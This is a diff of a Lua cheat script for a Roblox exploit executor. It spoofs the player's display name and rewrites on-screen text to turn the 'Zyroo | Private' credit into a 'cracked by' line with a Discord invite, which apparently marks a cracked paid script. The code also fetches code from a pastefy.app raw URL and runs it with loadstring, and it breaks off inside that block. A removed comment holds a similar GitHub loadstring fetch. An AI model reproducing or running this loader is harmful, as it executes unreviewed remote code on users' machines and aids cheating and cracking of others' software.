@@ -1,8 +1,5 @@
--- loadstring(game:HttpGet("https://raw.githubusercontent.com/VapeVoidware/VW-Add/main/nightsintheforest.lua", true))() 
-
 --[[
 by Henne
-Single loader with spoof + replacement
 Modified to replace "Zyroo | Private"
 ]]
 
@@ -18,66 +15,58 @@ pcall(function()
     LocalPlayer.DisplayName = "12345AB801"
 end)
 
--- Helper function to replace "Zyroo | Private" in text
+-- Replacement function
 local function patchText(text)
     if typeof(text) == "string" then
-        local lowered = text:lower()
-        if lowered:find("zyroo | private", 1, true) then
-            -- Replace with credit line
-            return text:gsub("(?i)zyroo | private", "cracked? by Ilias discord.gg/w2XcZQeANj")
+        if string.find(text, "Zyroo | Private", 1, true) then
+            return string.gsub(text, "Zyroo | Private", "cracked? by Ilias discord.gg/w2XcZQeANj")
         end
     end
     return text
 end
 
--- Patch global environment (replaces any strings in fenv)
+-- Apply patch to a single TextLabel, and hook changes
+local function patchLabel(label)
+    if label:IsA("TextLabel") then
+        -- Patch existing
+        label.Text = patchText(label.Text)
+        -- Patch future changes
+        label:GetPropertyChangedSignal("Text"):Connect(function()
+            label.Text = patchText(label.Text)
+        end)
+    end
+end
+
+-- Patch environment strings
 for k, v in pairs(getfenv()) do
     if typeof(v) == "string" then
         getfenv()[k] = patchText(v)
     end
 end
 
--- Scan existing PlayerGui labels
+-- Patch all existing labels in PlayerGui
 local playerGui = LocalPlayer:WaitForChild("PlayerGui", 10)
 for _, obj in ipairs(playerGui:GetDescendants()) do
-    pcall(function()
-        if obj:IsA("TextLabel") then
-            obj.Text = patchText(obj.Text)
-        end
-    end)
+    pcall(function() patchLabel(obj) end)
 end
-
--- Patch new UI in PlayerGui
+-- Hook for new labels in PlayerGui
 playerGui.DescendantAdded:Connect(function(obj)
-    pcall(function()
-        if obj:IsA("TextLabel") then
-            obj.Text = patchText(obj.Text)
-        end
-    end)
+    pcall(function() patchLabel(obj) end)
 end)
 
--- Scan CoreGui labels
+-- Patch all existing labels in CoreGui
 for _, obj in ipairs(CoreGui:GetDescendants()) do
-    pcall(function()
-        if obj:IsA("TextLabel") then
-            obj.Text = patchText(obj.Text)
-        end
-    end)
+    pcall(function() patchLabel(obj) end)
 end
-
--- Patch new UI in CoreGui
+-- Hook for new labels in CoreGui
 CoreGui.DescendantAdded:Connect(function(obj)
-    pcall(function()
-        if obj:IsA("TextLabel") then
-            obj.Text = patchText(obj.Text)
-        end
-    end)
+    pcall(function() patchLabel(obj) end)
 end)
 
--- Just keeps a heartbeat connection alive
+-- Keep alive
 RunService.Heartbeat:Connect(function() end)
 
--- Load extra code from the web
+-- Load extra code
 pcall(function()
     local source = game:HttpGet("https://pastefy.app/mCTC42bW/raw")
     local func = loadstring(source)
